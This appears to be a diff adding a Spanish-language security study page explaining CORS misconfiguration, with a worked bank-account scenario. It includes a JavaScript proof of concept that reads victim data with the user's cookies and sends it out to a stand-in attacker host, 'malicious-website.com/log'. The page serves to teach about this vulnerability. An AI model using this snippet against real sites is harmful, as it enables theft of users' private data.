@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;https://portswigger.net/web-security/cors&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>https://portswigger.net/web-security/cors</p>
+
+<p><strong>Same-origin policy</strong> -&gt;  It generally allows a domain to issue requests to other domains, but not to access the responses.
+CORS -&gt; Headers shared between domains to allow full cross-origin access.</p>
+
+<p><strong>Ejemplo práctico de mala implementación de CORS :</strong></p>
+
+<pre><code class="language-request">GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://malicious-website.com
+Cookie: sessionid=... (la cookie de sesión del usuario)
+</code></pre>
+
+<pre><code class="language-request">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://malicious-website.com
+Access-Control-Allow-Credentials: true
+</code></pre>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">reqListener</span><span class="p">;</span>
+<span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">get</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">https://vulnerable-website.com/sensitive-victim-data</span><span class="dl">'</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+<span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+
+<span class="kd">function</span> <span class="nf">reqListener</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">//malicious-website.com/log?key=</span><span class="dl">'</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Envía una solicitud GET a https://vulnerable-website.com/sensitive-victim-data.
+req.withCredentials = true asegura que las cookies de sesión del usuario se incluyan en la solicitud.
+Cuando recibe la respuesta (this.responseText), redirige al navegador a malicious-website.com/log, enviando los datos sensibles obtenidos en la respuesta como parte de la URL.</p>
+
+<p><strong>Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations’ domains including their subdomains.</strong></p>
+
+<p><strong>How to test cors</strong> -&gt; https://zguyun.com/blog/how-to-test-cors-with-postman/</p>
+
+<hr />
+
+<p>Una mala implementación de CORS puede ser un problema grave de seguridad porque permite que un sitio web malicioso realice solicitudes a una API o aplicación web en nombre del usuario sin su conocimiento o consentimiento. Esto puede dar lugar a la filtración de datos sensibles y comprometer la cuenta o los datos del usuario en el servidor.</p>
+
+<h3 id="escenario-de-peor-caso-de-una-mala-implementación-de-cors">Escenario de peor caso de una mala implementación de CORS</h3>
+
+<p>Imagina una aplicación web bancaria (por ejemplo, <code class="language-plaintext highlighter-rouge">https://bank.com</code>) que expone una API para consultar el saldo, hacer transferencias, actualizar datos de perfil, etc. Supongamos que el servidor tiene una configuración de CORS insegura. Aquí tienes cómo se vería un ataque en este escenario:</p>
+
+<ol>
+  <li><strong>Configuración insegura de CORS en el servidor</strong>:
+    <ul>
+      <li>La API de <code class="language-plaintext highlighter-rouge">https://bank.com</code> permite solicitudes CORS desde cualquier origen al reflejar el valor de la cabecera <code class="language-plaintext highlighter-rouge">Origin</code> en <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code>.</li>
+      <li>Además, la cabecera <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials</code> está configurada en <code class="language-plaintext highlighter-rouge">true</code>, permitiendo el envío de cookies de sesión o tokens de autenticación en solicitudes CORS.</li>
+    </ul>
+  </li>
+  <li><strong>El usuario inicia sesión en <code class="language-plaintext highlighter-rouge">https://bank.com</code></strong>:
+    <ul>
+      <li>El usuario se autentica en el sitio y se le asigna una cookie de sesión que autoriza sus solicitudes a la API de <code class="language-plaintext highlighter-rouge">https://bank.com</code>.</li>
+    </ul>
+  </li>
+  <li><strong>El atacante crea un sitio malicioso</strong>:
+    <ul>
+      <li>El atacante crea un sitio malicioso, <code class="language-plaintext highlighter-rouge">https://malicious-website.com</code>, que contiene un script para acceder a la API de <code class="language-plaintext highlighter-rouge">https://bank.com</code> usando las credenciales del usuario.</li>
+    </ul>
+  </li>
+  <li><strong>El usuario visita el sitio malicioso</strong>:
+    <ul>
+      <li>El usuario visita <code class="language-plaintext highlighter-rouge">https://malicious-website.com</code> mientras aún está autenticado en <code class="language-plaintext highlighter-rouge">https://bank.com</code> en otra pestaña o en la misma sesión del navegador.</li>
+    </ul>
+  </li>
+  <li><strong>El sitio malicioso envía una solicitud CORS a la API del banco</strong>:
+    <ul>
+      <li>El script en <code class="language-plaintext highlighter-rouge">https://malicious-website.com</code> realiza una solicitud a <code class="language-plaintext highlighter-rouge">https://bank.com/api/accountDetails</code>, incluyendo la cookie de sesión del usuario, gracias a <code class="language-plaintext highlighter-rouge">credentials: "include"</code>.</li>
+      <li>Debido a la configuración insegura de CORS, el servidor en <code class="language-plaintext highlighter-rouge">https://bank.com</code> acepta la solicitud de <code class="language-plaintext highlighter-rouge">https://malicious-website.com</code> y responde con los detalles de la cuenta del usuario.</li>
+    </ul>
+  </li>
+  <li><strong>El atacante obtiene datos sensibles del usuario</strong>:
+    <ul>
+      <li>El sitio malicioso ahora tiene acceso a la respuesta de la API de <code class="language-plaintext highlighter-rouge">https://bank.com</code>, que contiene datos confidenciales, como el saldo, transacciones o información personal del usuario.</li>
+    </ul>
+  </li>
+  <li><strong>Posibilidad de operaciones maliciosas</strong>:
+    <ul>
+      <li>Si la API permite operaciones como transferencias bancarias o cambios de información, el sitio malicioso podría enviar solicitudes para transferir dinero, actualizar la dirección del usuario, o cualquier otra acción que el usuario autorizado puede realizar.</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="consecuencias-de-esta-configuración-insegura">Consecuencias de esta configuración insegura:</h3>
+
+<ul>
+  <li><strong>Acceso no autorizado a datos personales</strong>: El atacante puede obtener información sensible, como saldo bancario, historial de transacciones, o cualquier dato expuesto a través de la API.</li>
+  <li><strong>Robo de dinero</strong>: Si la API permite transacciones bancarias, el atacante podría realizar transferencias en nombre del usuario, lo cual tendría un impacto financiero directo.</li>
+  <li><strong>Modificación de datos</strong>: El atacante podría cambiar detalles personales, como el número de teléfono o la dirección, lo cual podría tener repercusiones en el acceso futuro del usuario.</li>
+  <li><strong>Exposición de otras vulnerabilidades</strong>: Si el sistema tiene otras vulnerabilidades (como inyección de SQL o vulnerabilidades de autenticación), el atacante podría explotarlas con más facilidad al tener acceso a la API desde cualquier origen.</li>
+</ul>
+
+<h3 id="lecciones-de-seguridad">Lecciones de seguridad</h3>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
